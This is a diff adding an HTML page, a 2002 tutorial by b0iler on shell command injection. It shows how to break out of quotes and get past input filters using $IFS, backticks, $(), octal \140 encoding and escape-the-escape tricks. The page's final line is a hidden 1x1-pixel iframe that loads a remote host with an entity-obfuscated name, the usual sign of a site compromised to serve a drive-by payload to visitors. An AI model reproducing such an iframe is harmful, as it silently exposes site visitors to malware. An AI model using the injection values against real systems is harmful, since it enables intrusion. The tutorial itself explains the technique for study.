@@ -1,0 +1,154 @@
+<html>
+
+<head>
+<title>Escape Quotes In Shell - by b0iler</title>
+</head>
+
+<body bgcolor="black">
+<font color="white">
+
+<h1>Escape Quotes In Shell.</h1>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; by b0iler : <br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b0iler@hotmail.com : last update July 17th 2002<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Written for :<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a href="http://b0iler.eyeonsecurity.net">http://b0iler.eyeonsecurity.net</a> - my site full of other cool tutorials<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a href="http://blacksun.box.sk">http://blacksun.box.sk</a> - a legendary site full of original tutorials
+
+<br><br><br>
+
+(requires bash,zsh,other shells with these features.. although even ran under nobody with noshell in /etc/passwd this is still possible.)
+
+<br><br>
+
+This one is fairly useful to have.  Not the most used trick, but a good one to know.  I started researching this after I found a post by zen-parse on an exploit for x-chat : http://online.securityfocus.com/archive/1/76874
+
+<br><br>
+
+What is so cool about this is the use of $IFS (Internal Field Separators) to add a break (space,tab,newline) inbetween commands.  What the $IFS does is determine what the shell uses to seperate arguments.  If $IFS is a space, then a space can be used to seperate arguments, if it is 46s03 then 46s03 can be used to seperate arguments.
+
+<br><br>
+
+This is useful for scripts which filter spaces, or where spaces are not allowed.  zen-parse was forced to use this technique because spaces are not allowed in urls.  (they need to be url encoded into %20).  It is also useful when scripts filter spaces from user input that is printed to the shell.  example (using perl -e so you can test at the command line):
+
+<br><pre>
+
+perl -e '
+chomp($userinput=&lt;STDIN>);
+$userinput =~ s/\s//g;
+$userinput =~ s/\n//g;
+print `echo "$userinput"|cat`;
+'
+</pre><br>
+
+We are just pretending here, actual circumstances will vary.  vary so much that I will just talk about general situations and let you come up with the exploits by combining the info.
+
+<br><br>
+
+In this case we can execute commands by "breaking out" of the quotes with a single ", now we are into normal shell place (no quotes keeping this an argument of echo).  So we can use a metacharacter to stop this command and issue another.  A few avaliable are | ; && but there are many other characters which we can do tricky things at the shell with.
+
+<br><br>
+
+After the ; we will now put the next command we want executed, for this demonstration I'll do ls.  Then lets clean things up with another ".  To go along with the old one we broke out of.  So the final value for $userinput is:
+
+<br><br>
+
+";ls"
+
+<br><br>
+
+And if we need to use a space, we simply put a $IFS in there:
+
+<br><br>
+
+";ls$IFS/etc/"
+
+<br><br>
+
+There is more than just $IFS.  Lets just cut to the chase here.  The shell interprets what is sent, so lets just send some `cmd`.  This will execute the command and return the output right there.  try this for $userinput:
+
+<br><br>
+
+blah`ls`bleh
+
+<br><br>
+
+Simple huh.  But many times the arguments sent to the shell are filtered for the ` character.  Luckily there is the lesser used version of `cmd`, which is $(cmd).  This does the same thing, but gives you different characters which may or maynot be filtered.  So if ` is filtered, and $() is not you can use:
+
+<br><br>
+
+blah$(ls)bleh
+
+<br><br>
+
+What if the classic meta tag filter from various older cgi security papers is implemented to escape dangerous characters?  What then??
+
+<br><pre>
+
+perl -e '
+chomp($userinput=&lt;STDIN>);
+$userinput =~ s/\s//g;
+$userinput =~ s/\n//g;
+$userinput =~ s/([;&;t>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;  #or any regex that forgets to filter \
+print `echo "$userinput"|cat`;
+'
+</pre><br>
+
+Now we can do what rfp did, and escape the escape this regex puts in.. or we can look for other methods of exploitation.  Infact after reading the man pages for bash I found that bash also support \nnn encoding, where nnn is the octal value for the ascii character.  This will work perfect to evade these filters and still print any character.  do a man ascii to find out the octal value of the characters you want.  I think this should work for $useriput:
+
+<br><br>
+
+blah\140ls\140bleh
+
+<br><br>
+
+You should have guessed it.. 140 is the octal representation of ` (which as we know executes the command).  So this is the same thing to bash as: blah`ls`bleh.
+
+<br><br>
+
+The reason why it is not getting filtered by the s/([;&lt;>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g; is because the regex is looking for `, \140 is not `, it is just the characters \ 1 4 0 in a string.  But when the shell goes to interpret the string sent, it sees this and interprets it into `.  How nice.
+
+<br><br>
+
+Again, just to make it clear.  In perl the string \140 will get by ` filters, because it is not a `.  But once it is interpreted by the shell into a ` it becomes useable.  Perl does have the same \nnn encoding, but "\140" and '\140' are two different things to perl (all languages).  Remember that "$var" gets interpreted, '$var' does not.  user input does not get interpreted automaticly, it is a string (ie. '\140).  Hopefully no one got too confused.  Simple idea once you grasp it.
+
+<br><br>
+
+This same theory allows things like the string '\n' to get sent to the shell and get interpreted into a newline.  Look for other places where you can use this type of stuff.
+
+<br><br>
+
+One pitfall you may have already thought to this is the inability to break out of '' in the shell.  Since nothing is interpreted inside '$userinput' on the bash end none of our tricks really work.  The only one is to hope the script does not filter for ' so you can get out and do some magic.  Or hope that you can escape the escape in something like s/([badchars])/\\$1/g;
+
+<br><br>
+
+To escape you would simply put something like \' in the $userinput of the second example.  This will make the \' sent in to the regex to turn out like \\', thus escaping the escape the regex tries putting on.
+
+<br><br>
+
+That is pretty much all the tricks I can share.  Other things are common sense or need to be figured out on a situation to situation basis.  I would like to point out that whenever an external program is called from perl with any form of user input spechial attention needs to be provided to how that program handles data and any spechial features that program may have.
+
+<br><br>
+
+For example a root exploit in sperl was released in aug of 2000 [1] because user suppied data was sent to the /bin/mail command, which has a feature were if you have ~! on line it will call apon the shell and issue commands.  This is the same principale here, only difference is we are looking at the shell itself and not a "regular" program.  Since the shell is used so often it is a good target for a discussion.
+
+<br><br>
+
+The same logic here can also be applied to shell scripts, both local and running as CGI.
+
+<br><br>
+
+[1]http://www.securitybugware.org/mUNIXes/4609.html
+
+<br><br><br>
+
+<b>[-----]</b><br><br>
+
+<a href="http://b0iler.eyeonsecurity.net">http://b0iler.eyeonsecurity.net</a>&nbsp; Is my homepage, full of good tutorials, code, advisories, and other security related topics.&nbsp; Come and check out the message board some friends and I have started, many great disscussions to be had there.&nbsp; <a href="http://rawt.daemon.sh/wwwboard/">http://rawt.daemon.sh/wwwboard/</a>
+
+<br><br>
+<b>[-----]</b>
+
+<br><br><br><br>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body></html>
